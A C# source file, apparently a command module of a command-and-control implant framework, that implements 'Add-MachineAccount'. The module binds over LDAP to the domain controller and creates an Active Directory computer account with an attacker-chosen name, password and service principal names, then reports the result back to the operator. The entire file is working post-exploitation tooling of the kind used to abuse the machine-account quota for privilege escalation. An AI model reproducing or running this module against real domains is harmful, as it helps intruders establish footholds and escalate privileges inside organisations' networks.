using System;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.Protocols;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;

namespace Engineer.Commands
{
    internal class Add_MachineAccount : EngineerCommand
    {
        public override string Name => "Add-MachineAccount";

        public override async Task Execute(EngineerTask task)
        {
            //get the task.Arguments values for /name /password and create a amchine account with that name and password in the current domain 
            var name = task.Arguments.TryGetValue("/name", out string nameValue) ? nameValue : null;
            var Machinepassword = task.Arguments.TryGetValue("/machinepassword", out string passwordValue) ? passwordValue : null;
            var domain = task.Arguments.TryGetValue("/domain", out string domainValue) ? domainValue : null;

            //get values for username, password
            var username = task.Arguments.TryGetValue("/username", out string usernameValue) ? usernameValue : null;
            var password = task.Arguments.TryGetValue("/password", out string userPasswordValue) ? userPasswordValue : null;

            //if domain is null get the current domain
            if (domain == null)
            {
                domain = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            //if name is null return an error
            if (name == null)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-] Name is required",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                return;
            }
            //if password is null return an error
            if (Machinepassword == null)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-] Machine Account Password is required",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                return;
            }
            //create the machine account
            try
            {
                name = name.TrimStart(' ');
                //connect to ldap, create the machine account, setting its useraccountcontrol, samaccountname, unicodepwd
                Domain currentDomain = Domain.GetComputerDomain();
                string sPDC = currentDomain.PdcRoleOwner.Name;

                string sDistName = "CN=" + name + ",CN=Computers";
                foreach (string sPart in domain.ToLower().Split(new char[] { '.' }))
                {
                    sDistName += ",DC=" + sPart;
                }

                // Are we supplying creds?
                NetworkCredential credObj = null;
                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    credObj = new NetworkCredential(username, password, domain);
                }

                // Create connection object
                LdapDirectoryIdentifier oConId = new LdapDirectoryIdentifier(sPDC, 389);
                LdapConnection oConObject = null;
                if (credObj != null)
                {
                    oConObject = new LdapConnection(oConId, credObj);
                }
                else
                {
                    oConObject = new LdapConnection(oConId);
                }

                // Initiate an LDAP bind
                oConObject.SessionOptions.Sealing = true; // Encrypt and sign our
                oConObject.SessionOptions.Signing = true; // session traffic
                oConObject.Bind();

                // Create machine object
                AddRequest oLDAPReq = new AddRequest();
                oLDAPReq.DistinguishedName = sDistName;
                oLDAPReq.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("SamAccountName", name + "$"));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("DnsHostName", name + "." + domain));
                oLDAPReq.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", new string[] { "HOST/" + name + "." + domain, "RestrictedKrbHost/" + name + "." + domain, "HOST/" + name, "RestrictedKrbHost/" + name }));

                // Set machine password
                oLDAPReq.Attributes.Add(new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes('"' + Machinepassword + '"')));

                // Send request
                oConObject.SendRequest(oLDAPReq);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[+] Machine Account Created: " + name,task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-] Error Creating Machine Account: " + e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
